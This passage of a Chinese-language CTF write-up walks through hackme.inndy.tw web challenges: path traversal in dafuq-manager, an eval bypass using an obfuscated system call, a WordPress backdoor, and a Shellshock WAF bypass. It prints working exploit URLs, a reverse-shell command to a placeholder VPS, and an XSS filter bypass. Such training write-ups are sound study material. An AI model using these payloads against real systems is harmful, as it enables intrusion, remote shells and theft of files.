class=\"string\">\"fileexist\"</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!get_show_item($dir, $item)) show_error($item . <span class=\"string\">\": \"</span> . $GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"accessfile\"</span>]);</span><br><span class=\"line\">    $fname = get_abs_item($dir, $item);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!file_in_web($fname)) show_error($GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"accessfile\"</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($GLOBALS[<span class=\"string\">'__POST'</span>][<span class=\"string\">\"dosave\"</span>]) &amp;&amp; $GLOBALS[<span class=\"string\">'__POST'</span>][<span class=\"string\">\"dosave\"</span>] == <span class=\"string\">\"yes\"</span>) &#123;</span><br><span class=\"line\">        $item = basename(stripslashes($GLOBALS[<span class=\"string\">'__POST'</span>][<span class=\"string\">\"fname\"</span>]));</span><br><span class=\"line\">        $fname2 = get_abs_item($dir, $item);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>($item) || $item == <span class=\"string\">\"\"</span>) show_error($GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"miscnoname\"</span>]);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($fname != $fname2 &amp;&amp; @file_exists($fname2)) show_error($item . <span class=\"string\">\": \"</span> . $GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"itemdoesexist\"</span>]);</span><br><span class=\"line\">        savefile($dir, $fname2);</span><br><span class=\"line\">        $fname = $fname2;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $fp = @fopen($fname, <span class=\"string\">\"r\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($fp === <span class=\"keyword\">false</span>) show_error($item . <span class=\"string\">\": \"</span> . $GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"openfile\"</span>]);</span><br><span class=\"line\">    $s_item = get_rel_item($dir, $item);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (strlen($s_item) &gt; <span class=\"number\">50</span>) $s_item = <span class=\"string\">\"...\"</span> . substr($s_item, <span class=\"number\">-47</span>);</span><br><span class=\"line\">    show_header($GLOBALS[<span class=\"string\">\"messages\"</span>][<span class=\"string\">\"actedit\"</span>] . <span class=\"string\">\": /\"</span> . $s_item);</span><br></pre></td></tr></table></figure>\n<p>函数中有三条过滤</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (($GLOBALS[<span class=\"string\">\"permissions\"</span>] &amp; <span class=\"number\">01</span>) != <span class=\"number\">01</span>) show_error($GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"accessfunc\"</span>]);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (!get_is_file($dir, $item)) show_error($item . <span class=\"string\">\": \"</span> . $GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"fileexist\"</span>]);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (!get_show_item($dir, $item)) show_error($item . <span class=\"string\">\": \"</span> . $GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"accessfile\"</span>]);</span><br></pre></td></tr></table></figure>\n<p>第一条权限验证guest权限显然是满足的，第二条判断文件是否存在，不需要考虑，第三个我们跟进函数看一下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get_show_item</span><span class=\"params\">($dir, $item)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($item == <span class=\"string\">\".\"</span> || $item == <span class=\"string\">\"..\"</span>) <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($_COOKIE[<span class=\"string\">'help'</span>] == <span class=\"string\">'me'</span>) &#123;</span><br><span class=\"line\">        $_COOKIE[<span class=\"string\">'help'</span>] = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        setcookie(<span class=\"string\">'help'</span>, <span class=\"string\">''</span>, time() - <span class=\"number\">9999999999</span>);</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'&lt;script&gt;alert(\"Very good. You know how to create cookie. How about tamper a cookie?\")&lt;/script&gt;'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">empty</span>($_COOKIE[<span class=\"string\">'show_hidden'</span>])) &#123;</span><br><span class=\"line\">        setcookie(<span class=\"string\">'show_hidden'</span>, <span class=\"string\">'no'</span>, time() + <span class=\"number\">3600</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (substr($item, <span class=\"number\">0</span>, <span class=\"number\">1</span>) == <span class=\"string\">\".\"</span> &amp;&amp; $GLOBALS[<span class=\"string\">\"show_hidden\"</span>] == <span class=\"keyword\">false</span> &amp;&amp; $_COOKIE[<span class=\"string\">'show_hidden'</span>] != <span class=\"string\">'yes'</span>) <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($GLOBALS[<span class=\"string\">\"no_access\"</span>] != <span class=\"string\">\"\"</span> &amp;&amp; @eregi($GLOBALS[<span class=\"string\">\"no_access\"</span>], $item)) <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($GLOBALS[<span class=\"string\">\"show_hidden\"</span>] == <span class=\"keyword\">false</span>) &#123;</span><br><span class=\"line\">        $dirs = explode(<span class=\"string\">\"/\"</span>, $dir);</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> ($dirs <span class=\"keyword\">as</span> $i) <span class=\"keyword\">if</span> (substr($i, <span class=\"number\">0</span>, <span class=\"number\">1</span>) == <span class=\"string\">\".\"</span>) <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>题目仅仅对$item进行了简单的过滤， <code>if ($item == &quot;.&quot; || $item == &quot;..&quot;) return false;</code> ，那么我们可以考虑用目录穿越 <code>../../</code> 绕过</p>\n<p>那么至此我们可以在网站中找到edit相关的函数，发起请求（注意cookie中show_hidden对应的值要改为yes）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;dafuq-manager.hackme.inndy.tw&#x2F;index.php?action&#x3D;edit&amp;item&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;webhdisk&#x2F;.config&#x2F;.htusers.php&amp;order&#x3D;name&amp;srt&#x3D;yes&amp;lang&#x3D;en</span><br></pre></td></tr></table></figure>\n<p>于是可以读到目标文件</p>\n<p><img src=\"/2020/09/13/hackme-1/3.png\" alt=\".htusers.php\"></p>\n<p>然后用admin用户登录即可，注意密码要进行md5解密即可，密码为 <code>how do you turn this on</code> ，登录即可读取flag</p>\n<h1 id=\"dafuq-manager-3\"><a href=\"#dafuq-manager-3\" class=\"headerlink\" title=\"dafuq-manager 3\"></a>dafuq-manager 3</h1><p>题目给出了信息</p>\n<blockquote>\n<p>For flag3, you need a shell to get that. see $WEBROOT/flag3!</p>\n</blockquote>\n<p>这关我们需要getsheel读取文件，那么我们在源码中寻找可以执行系统命令的语句，在文件中尝试搜索关键词 <code>eval</code> ，在fun_debug.php中发现存在该函数，跟进一下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">do_debug</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    assert(strlen($GLOBALS[<span class=\"string\">'secret_key'</span>]) &gt; <span class=\"number\">40</span>);</span><br><span class=\"line\">    $dir = $GLOBALS[<span class=\"string\">'__GET'</span>][<span class=\"string\">'dir'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (strcmp($dir, <span class=\"string\">\"magically\"</span>) || strcmp($dir, <span class=\"string\">\"hacker\"</span>) || strcmp($dir, <span class=\"string\">\"admin\"</span>)) &#123;</span><br><span class=\"line\">        show_error(<span class=\"string\">'You are not hacky enough :('</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">list</span>($cmd, $hmac) = explode(<span class=\"string\">'.'</span>, $GLOBALS[<span class=\"string\">'__GET'</span>][<span class=\"string\">'command'</span>], <span class=\"number\">2</span>);</span><br><span class=\"line\">    $cmd = base64_decode($cmd);</span><br><span class=\"line\">    $bad_things = <span class=\"keyword\">array</span>(<span class=\"string\">'system'</span>, <span class=\"string\">'exec'</span>, <span class=\"string\">'popen'</span>, <span class=\"string\">'pcntl_exec'</span>, <span class=\"string\">'proc_open'</span>, <span class=\"string\">'passthru'</span>, <span class=\"string\">'`'</span>, <span class=\"string\">'eval'</span>, <span class=\"string\">'assert'</span>, <span class=\"string\">'preg_replace'</span>, <span class=\"string\">'create_function'</span>, <span class=\"string\">'include'</span>, <span class=\"string\">'require'</span>, <span class=\"string\">'curl'</span>,);</span><br><span class=\"line\">    <span class=\"keyword\">foreach</span> ($bad_things <span class=\"keyword\">as</span> $bad) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (stristr($cmd, $bad)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">'2bad'</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (hash_equals(hash_hmac(<span class=\"string\">'sha256'</span>, $cmd, $GLOBALS[<span class=\"string\">\"secret_key\"</span>]), $hmac)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"keyword\">eval</span>($cmd));</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        show_error(<span class=\"string\">'What does the fox say?'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>对于dir的过滤，我们可以利用strcmp的数组绕过特性来绕过，题目还过滤了一些系统函数，我们可以考虑通过base64编码绕过，而对于$GLOBALS[‘__GET’][‘command’]变量的生成，题目也给出了生成函数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">make_command</span><span class=\"params\">($cmd)</span> </span>&#123;</span><br><span class=\"line\">    $hmac = hash_hmac(<span class=\"string\">'sha256'</span>, $cmd, $GLOBALS[<span class=\"string\">\"secret_key\"</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> sprintf(<span class=\"string\">'%s.%s'</span>, base64_encode($cmd), $hmac);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>所以我们可以自己生成command</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">make_command</span><span class=\"params\">($cmd)</span> </span>&#123;</span><br><span class=\"line\">    $hmac = hash_hmac(<span class=\"string\">'sha256'</span>, $cmd, <span class=\"string\">\"KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> sprintf(<span class=\"string\">'%s.%s'</span>, base64_encode($cmd), $hmac);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var_dump(make_command(<span class=\"string\">'$a=\\'sys\\';$b=\\'tem\\';$c=$a.$b;$c(base64_decode(\\'Li9mbGFnMy9tZW93IGZsYWczL2ZsYWcz\\'));'</span>));</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>注意本题不能直接读取flag，要通过运行目录下的一个c文件来间接读取flag，最终payload如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;dafuq-manager.hackme.inndy.tw&#x2F;index.php?action&#x3D;debug&amp;dir[]&#x3D;admin&amp;command&#x3D;JGE9J3N5cyc7JGI9J3RlbSc7JGM9JGEuJGI7JGMoYmFzZTY0X2RlY29kZSgnTGk5bWJHRm5NeTl0Wlc5M0lHWnNZV2N6TDJac1lXY3onKSk7.001e9b2112bdf0443a0eaf4a489f477d1cf525cf58f05286606007046856460b&amp;order&#x3D;name&amp;srt&#x3D;yes&amp;lang&#x3D;en</span><br></pre></td></tr></table></figure>\n<p>做完后感觉自己好菜呀，这代码审计的我晕头转向，233333…</p>\n<h1 id=\"wordpress-1\"><a href=\"#wordpress-1\" class=\"headerlink\" title=\"wordpress 1\"></a>wordpress 1</h1><p>WordPress代码审计，在backup file中可以下载到源码，打开源码，随便翻一下，在 <code>wp-content/plugins/core.php</code> 中发现了一段代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">print_f14g</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t$h = <span class=\"string\">'m'</span>.sprintf(<span class=\"string\">'%s%d'</span>,<span class=\"string\">'d'</span>,<span class=\"number\">-4</span>+<span class=\"number\">9e0</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>($h($_GET[<span class=\"string\">'passw0rd'</span>]) === <span class=\"string\">'5ada11fd9c69c78ea65c832dd7f9bbde'</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(wp_get_user_ip() === <span class=\"string\">'127.0.0.1'</span>) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">eval</span>(mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $h($_GET[<span class=\"string\">'passw0rd'</span>].AUTH_KEY), base64_decode(<span class=\"string\">'zEFnGVANrtEUTMLVyBusu4pqpHjqhn3X+cCtepGKg89VgIi6KugA+hITeeKIpnQIQM8UZbUkRpuCe/d8Rf5HFQJSawpeHoUg5NtcGam0eeTw+1bnFPT3dcPNB8IekPBDyXTyV44s3yaYMUAXZWthWHEVDFfKSjfTpPmQkB8fp6Go/qytRtiP3LyYmofhOOOV8APh0Pv34VPjCtxcJUpqIw=='</span>), MCRYPT_MODE_CBC, $h($_GET[<span class=\"string\">'passw0rd'</span>].AUTH_SALT)));</span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">die</span>(<span class=\"string\">'&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Sorry, Only admin from localhost can get flag'</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>我们把代码中的md5解密一下发现是 <code>cat flag</code>，而题目要求从本地访问，我们可以通过修改x-forwarded-for字段实现，所以修改请求头之后，在访问</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;wp.hackme.inndy.tw&#x2F;?passw0rd&#x3D;cat%20flag</span><br></pre></td></tr></table></figure>\n<p>查看元素即可找到flag</p>\n<h1 id=\"wordpress-2\"><a href=\"#wordpress-2\" class=\"headerlink\" title=\"wordpress 2\"></a>wordpress 2</h1><p>随便翻一下博客上的文章，发现有2013年10月发表了一篇文章，题目为flag2，但是需要密码，审计代码发现在content-search.php中有如下语句</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;!-- debug:<span class=\"meta\">&lt;?php</span> var_dump($wp_query-&gt;post-&gt;&#123;<span class=\"string\">'post_'</span>.(string)($_GET[<span class=\"string\">'debug'</span>]?:<span class=\"string\">'type'</span>)&#125;); <span class=\"meta\">?&gt;</span> --&gt;</span><br></pre></td></tr></table></figure>\n<p>看到query，应该是在搜索页面，所以我们提交的payload应该为</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;wp.hackme.inndy.tw&#x2F;archives&#x2F;date&#x2F;2013&#x2F;10?s&#x3D;&amp;debug&#x3D;content</span><br></pre></td></tr></table></figure>\n<h1 id=\"command-executor\"><a href=\"#command-executor\" class=\"headerlink\" title=\"command-executor\"></a>command-executor</h1><p>随便点击，发现有func参数存在文件读取漏洞，利用filter协议可以读取文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;command-executor.hackme.inndy.tw&#x2F;index.php?func&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index</span><br></pre></td></tr></table></figure>\n<p>base64解码一下得到源代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$pages = [</span><br><span class=\"line\">    [<span class=\"string\">'man'</span>, <span class=\"string\">'Man'</span>],</span><br><span class=\"line\">    [<span class=\"string\">'untar'</span>, <span class=\"string\">'Tar Tester'</span>],</span><br><span class=\"line\">    [<span class=\"string\">'cmd'</span>, <span class=\"string\">'Cmd Exec'</span>],</span><br><span class=\"line\">    [<span class=\"string\">'ls'</span>, <span class=\"string\">'List files'</span>],</span><br><span class=\"line\">];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">fuck</span><span class=\"params\">($msg)</span> </span>&#123;</span><br><span class=\"line\">    header(<span class=\"string\">'Content-Type: text/plain'</span>);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> $msg;</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$black_list = [</span><br><span class=\"line\">    <span class=\"string\">'\\/flag'</span>, <span class=\"string\">'\\(\\)\\s*\\&#123;\\s*:;\\s*\\&#125;;'</span></span><br><span class=\"line\">];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">waf</span><span class=\"params\">($a)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">global</span> $black_list;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(is_array($a)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span>($a <span class=\"keyword\">as</span> $key =&gt; $val) &#123;</span><br><span class=\"line\">            waf($key);</span><br><span class=\"line\">            waf($val);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span>($black_list <span class=\"keyword\">as</span> $b) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">\"/$b/\"</span>, $a) === <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">                fuck(<span class=\"string\">\"$b detected! exit now.\"</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">waf($_SERVER);</span><br><span class=\"line\">waf($_GET);</span><br><span class=\"line\">waf($_POST);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">execute</span><span class=\"params\">($cmd, $shell=<span class=\"string\">'bash'</span>)</span> </span>&#123;</span><br><span class=\"line\">    system(sprintf(<span class=\"string\">'%s -c %s'</span>, $shell, escapeshellarg($cmd)));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">foreach</span>($_SERVER <span class=\"keyword\">as</span> $key =&gt; $val) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(substr($key, <span class=\"number\">0</span>, <span class=\"number\">5</span>) === <span class=\"string\">'HTTP_'</span>) &#123;</span><br><span class=\"line\">        putenv(<span class=\"string\">\"$key=$val\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$page = <span class=\"string\">''</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'func'</span>])) &#123;</span><br><span class=\"line\">    $page = $_GET[<span class=\"string\">'func'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(strstr($page, <span class=\"string\">'..'</span>) !== <span class=\"keyword\">false</span>) &#123;</span><br><span class=\"line\">        $page = <span class=\"string\">''</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>($page &amp;&amp; strlen($page) &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">include</span>(<span class=\"string\">\"$page.php\"</span>);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (<span class=\"keyword\">Exception</span> $e) &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>题目有一个putenv()敏感函数，百度可知存在一个2014年的一个重大漏洞 <code>CVE-2014-6271(破壳（shellsock）漏洞)</code> ，在freebuf中有一个链接</p>\n<blockquote>\n<p><a href=\"http://www.freebuf.com/articles/system/45390.html\" target=\"_blank\" rel=\"noopener\">http://www.freebuf.com/articles/system/45390.html</a></p>\n</blockquote>\n<p>国外有一个漏洞利用的文章，</p>\n<blockquote>\n<p><a href=\"https://security.stackexchange.com/questions/68325/shellshock-attack-scenario-exploiting-php\" target=\"_blank\" rel=\"noopener\">https://security.stackexchange.com/questions/68325/shellshock-attack-scenario-exploiting-php</a></p>\n</blockquote>\n<p><img src=\"/2020/09/13/hackme-1/4.png\" alt=\"exp\"></p>\n<p>但是直接利用会被waf掉，所以我们要考虑绕过正则</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#39;\\(\\)\\s*\\&#123;\\s*:;\\s*\\&#125;;&#39;</span><br></pre></td></tr></table></figure>\n<p>题目的正则中 <code>:;</code> 是存在漏洞的，我们可以用 <code>: ;</code> 绕过，重试一下发现可以成功，我们可以开始执行shell命令，尝试访问flag，一波探测之后发现读取flag时遇到了又遇到了waf，这次是 <code>\\/flag</code> 我们可以利用通配符绕过，</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">wget --header&#x3D;&quot;X-Exploit: () &#123; : ; &#125;; &#x2F;bin&#x2F;cat ..&#x2F;..&#x2F;..&#x2F;?lag-reader.c&quot; -q -O -  &quot;https:&#x2F;&#x2F;command-executor.hackme.inndy.tw&#x2F;index.php?func&#x3D;cmd&amp;cmd&#x3D;env&quot;</span><br></pre></td></tr></table></figure>\n<p>但是并没有出现flag，发现是因为只有root才有文件的读权限</p>\n<p><img src=\"/2020/09/13/hackme-1/5.png\" alt></p>\n<p>但是题目中有一个flag-reader文件，我们尝试读取一下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">wget --header&#x3D;&quot;X-Exploit: () &#123; : ; &#125;; &#x2F;bin&#x2F;cat ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;?lag-reader.c&quot; -q -O - &quot;https:&#x2F;&#x2F;command-executor.hackme.inndy.tw&#x2F;index.php?func&#x3D;cmd&amp;cmd&#x3D;env&quot;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">include &lt;unistd.h&gt;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;syscall.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> *argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> buff[<span class=\"number\">4096</span>], rnd[<span class=\"number\">16</span>], val[<span class=\"number\">16</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(syscall(SYS_getrandom, &amp;rnd, <span class=\"keyword\">sizeof</span>(rnd), <span class=\"number\">0</span>) != <span class=\"keyword\">sizeof</span>(rnd)) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">write</span>(<span class=\"number\">1</span>, <span class=\"string\">\"Not enough random\\n\"</span>, <span class=\"number\">18</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tsetuid(<span class=\"number\">1337</span>);</span><br><span class=\"line\">\tseteuid(<span class=\"number\">1337</span>);</span><br><span class=\"line\">\talarm(<span class=\"number\">1</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">write</span>(<span class=\"number\">1</span>, &amp;rnd, <span class=\"keyword\">sizeof</span>(rnd));</span><br><span class=\"line\">\t<span class=\"built_in\">read</span>(<span class=\"number\">0</span>, &amp;val, <span class=\"keyword\">sizeof</span>(val));</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(<span class=\"built_in\">memcmp</span>(rnd, val, <span class=\"keyword\">sizeof</span>(rnd)) == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> fd = <span class=\"built_in\">open</span>(argv[<span class=\"number\">1</span>], O_RDONLY);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(fd &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">int</span> s = <span class=\"built_in\">read</span>(fd, buff, <span class=\"number\">1024</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(s &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">write</span>(<span class=\"number\">1</span>, buff, s);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">close</span>(fd);</span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">write</span>(<span class=\"number\">1</span>, <span class=\"string\">\"Can not open file\\n\"</span>, <span class=\"number\">18</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">write</span>(<span class=\"number\">1</span>, <span class=\"string\">\"Wrong response\\n\"</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>代码的大致意思就是要我们一秒内把它输出的内容在输入回去，即可以打出文件内容，但是以我们现在的交互方式显然太慢了，最好反弹一个shell</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">wget --header&#x3D;&quot;X-Exploit: () &#123; : ; &#125;; &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;your_vps_ip&#x2F;8888 0&gt;&amp;1&quot; -q -O -  &quot;https:&#x2F;&#x2F;command-executor.hackme.inndy.tw&#x2F;index.php?func&#x3D;cmd&amp;cmd&#x3D;env&quot;</span><br></pre></td></tr></table></figure>\n<p>又发现在/var/tmp目录是可写的，所以我们可以利用该目录来读flag</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">flag-reader flag &gt; /var/tmp/content &lt; /var/tmp/content</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">cat content</span><br></pre></td></tr></table></figure>\n<h1 id=\"xssme\"><a href=\"#xssme\" class=\"headerlink\" title=\"xssme\"></a>xssme</h1><p>先注册一个账号登录一下， 发现有一个send email功能，而题目又说xssme，猜测应该是存在xss漏洞，测试一下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;alert(&#39;123&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>\n<p>回显script标签和（被过滤了，尝试绕过，onerror等也都被过滤了，发现可以用svg/onload来做</p>\n<p><img src=\"/2020/09/13/hackme-1/7.png\" alt=\"payload\"></p>\n<p>然后在自己的ceve账号中收到回显</p>\n<p><img src=\"/2020/09/13/hackme-1/6.png\" alt=\"回显\"></p>\n<h1 id=\"xssrf-leak\"><a href=\"#xssrf-leak\" class=\"headerlink\" title=\"xssrf leak\"></a>xssrf 